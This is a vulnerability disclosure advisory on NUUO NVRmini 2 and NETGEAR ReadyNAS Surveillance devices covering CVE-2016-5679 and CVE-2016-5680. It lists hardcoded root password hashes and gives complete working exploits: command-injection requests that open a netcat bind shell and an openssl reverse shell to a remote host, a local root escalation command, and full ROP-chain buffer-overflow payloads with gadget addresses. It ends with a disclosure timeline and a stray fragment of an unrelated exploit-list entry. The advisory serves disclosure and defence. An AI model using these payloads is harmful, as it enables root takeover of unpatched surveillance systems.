The NVRmini 2 and NVRsolo contain two hardcoded root passwords (one is commented). These passwords have not been cracked, but they are present in the firmware images which are deployed to all NVRmini 2 / NVRsolo devices.
NVRmini 2:
root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::
NVRsolo:
root:$1$72ZFYrXC$aDYHvkWBGcRRgCrpSCpiw1:0:0:99999:7:::
Vulnerability: Command injection in cgi_main transfer license command
CVE-2016-5679
Attack Vector: Local / Remote
Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)
The transfer_license command has a command injection vulnerability in the ""sn"" parameter:
cgi_main?cmd=transfer_license&method=offline&sn="";<command>;#
Sample exploit for NVRmini2 (open bind shell on port 4444):
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bnc+-l+-p+4444+-e+/bin/sh+%26+%23
NETGEAR Surveillance doesn't have netcat, but we can get an openssl reverse shell to 192.168.133.204:4444 instead:
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=""%3bmkfifo+/tmp/s%3b+/bin/bash+-i+<+/tmp/s+2>%261+|+openssl+s_client+-quiet+-connect+192.168.133.204%3a4444+>+/tmp/s%3b+rm+/tmp/s%3b%23
> Local exploitation:
This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command:
CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>'
The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.
Vulnerability: Stack buffer overflow in cgi_main transfer license command
CVE-2016-5680
Attack Vector: Local / Remote
Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
- NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)
The ""sn"" parameter in transfer_license cgi_main method not only has a command injection vulnerability, but also a stack buffer overflow. Below is the pseudocode of the affected function - as it can be seen in the sprintf line, the ""sn"" parameter is copied directly into a string with a fixed length of 128 characters.
Function 0x20BC9C (NVRmini2 firmware v3.0.0):
method = getval(""method"");
sn = getval(""sn"");
memset(&command, 0, 128);
sprintf(&command, ""logger -p local0.info -t 'system' \""Activate license: %s\"""", sn);
system(&command);
> For example if the following request is performed:
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
> A core file is generated:
Core was generated by `/NUUO/bin/cgi_main'.
Program terminated with signal SIGSEGV, Segmentation fault.
(gdb) i r
r0             0x00
r1             0x00
r2             0x407aa4d01081779408
r3             0x407aa9e01081780704
r4             0x616161611633771873
r5             0x616161611633771873
r6             0x616161611633771873
r7             0x616161611633771873
r8             0x331fc83350472
r9             0x11
r10            0x33db543398484
r11            0x00
r12            0x11
sp             0xbedce5280xbedce528
lr             0x616161611633771873
pc             0x616161600x61616160
cpsr           0x600000301610612784
(gdb)
The request can be sent by an HTTP GET or POST method.
> A few registers can be controlled with the sn parameter, as it can be seen in the diagram below for the NVRmini2:
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4444555566667777PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
aaaa: filler
PPPP: pc / lr register content, offset 976
4444: r4 register content, offset 962
5555: r5 register content, offset 966
6666: r6 register content, offset 970
7777: r7 register content, offset 974
SSSS: start of stack pointer, offset 992
> On the ReadyNAS Surveillance one additional register (r8) can be controlled:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa44445555666677778888PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
aaaa: filler
PPPP: pc / lr register content, offset 986
4444: r4 register content, offset 968
5555: r5 register content, offset 970
6666: r6 register content, offset 974
7777: r7 register content, offset 978
8888: r8 register content, offset 982
SSSS: start of stack pointer, offset 1002
> Exploit mitigations and constraints
The table below shows the exploit mitigation technologies for each target:
NVRmini2   ReadyNAS
NX          Y          Y
RELRO    Partial    Partial
ASLR        N          Y
An additional constraint to keep in mind is that there can be no null bytes in the exploit as the vulnerability is in the sprintf copy operation (which uses a null byte as the string terminator).
> Exploitation in the NVRmini2 (firmware v3.0.0):
This example exploit creates a root bind shell on port 4444 using ROP gadgets to bypass NX. The gadgets were taken from libc-2.15.so, which is always loaded at 4066c000 in firmware 3.0.0.
0x00018ba0 : pop {r3, lr} ; bx lr -> located at 40684BA0 (first gadget, sets up r3 for the next gadget)
0x000f17cc : mov r0, sp ; blx r3 -> located at 4075D7CC (second gadget, set up args for system)
0x00039ffc : system() -> located at 406A5FFC (takes the argument from r0 - pointing to sp - and executes it)
Payload (in the stack) -> %6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26 (""nc -l -p 4444 -e /bin/sh &"")
Illustration:
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{first_gadget}aaaaaaaaaaaa{system()_address}{second_gadget}{stack}
Exploit for NVRmini2 firmware v3.0.0 (""sn"" parameter value):
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%a0%4b%68%40aaaaaaaaaaaa%fc%5f%6a%40%cc%d7%75%40%6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26
Other firmware versions will have different gadget addresses. On version 3.0.0 it should work without any modification.
> Exploitation on ReadyNAS Surveillance (version v1.1.2):
To develop this example exploit libcrypto.so.0.9.8 was used. The library is loaded at B6xxx000, where xxx are 4096 possible values for the memory address, as the ReadyNAS has a weak form of ASLR. For this exploit, B6CCE000 was chosen as the target base address (this was chosen randomly from a sample of collected base addresses).
The exploit connects a reverse shell to 192.168.133.204:4444 using OpenSSL. The following ROP gadgets were used:
0x000b3d9c : mov r1, sp ; mov r2, ip ; blx r6 -> located at B6D81D9C (first gadget, gets the location of the stack pointer sp, where the shellcode is located, in r1)
0x00008690 : movs r0, r1 ; movs r0, r0 ; movs r2, r2 ; movs r2, r1 ; bx r7 -> located at B6CD6691 as this is a THUMB mode gadget (second gadget, sets up the arguments to system(), putting them into r0)
0xb6ef91bc: fixed system() address when B6CCE000 is chosen as the base address of libcrypto.so.0.9.8 (takes the argument from r0 - pointing to sp - and executes it)
Payload: (in the stack) -> %6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26 (""mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.133.204:4444 > /tmp/s; rm /tmp/s &"")
Illustration:
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{second_gadget}{system_address}aaaa{first_gadget}aaaaaaaaaaaa{payload}
Exploit for ReadyNAS Surveillance v1.1.2 (""sn"" parameter value):
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%91%66%cd%b6%bc%91%ef%b6aaaa%9c%1d%d8%b6aaaaaaaaaaaa%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26
Note that due to the ASLR in the ReadyNAS his exploit has be attempted at few times in order for it to work. Usually less than 20 tries is enough to get the reverse shell to connect back.
> Local exploitation:
This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command:
CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>'
The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.
It is likely that all other vulnerabilities in this advisory are exploitable by a local attacker, however this has only been tested for the stack buffer overflow.
>> Fix:
NETGEAR and Nuuo did not respond to CERT/CC coordination efforts (see Timeline below), so no fix is available.
Do not expose any of these devices to the Internet or any networks with unstrusted hosts.
Timeline:
28.02.2016: Disclosure to CERT/CC.
27.04.2016: Requested status update from CERT - they did not receive any response from vendors.
06.06.2016: Requested status update from CERT - still no response from vendors.
Contacted Nuuo and NETGEAR directly. NETGEAR responded with their ""Responsible Disclosure Guidelines"", to which I did not agree and requested them to contact CERT if they want to know the details about the vulnerabilities found. No response from Nuuo.
13.06.2016: CERT sent an update saying that NETGEAR has received the details of the vulnerabilities, and they are attempting to contact Nuuo via alternative channels.
07.07.2016: CERT sent an update saying that they have not received any follow up from both Nuuo and NETGEAR, and that they are getting ready for disclosure.
17.07.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received.
01.08.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received.
04.08.2016: Coordinated disclosure with CERT.
>> References:
[1] https://www.kb.cert.org/vuls/id/856152
Agile Information Security Limited
>> Enabling secure digital business >>"
2013-06-05,WebApps,CGI,Tim Herres,QNAP VioStor NVR / QNAP NAS,Remote Code Execution,"source: https://www.securityfocus.com/bid/60354/info
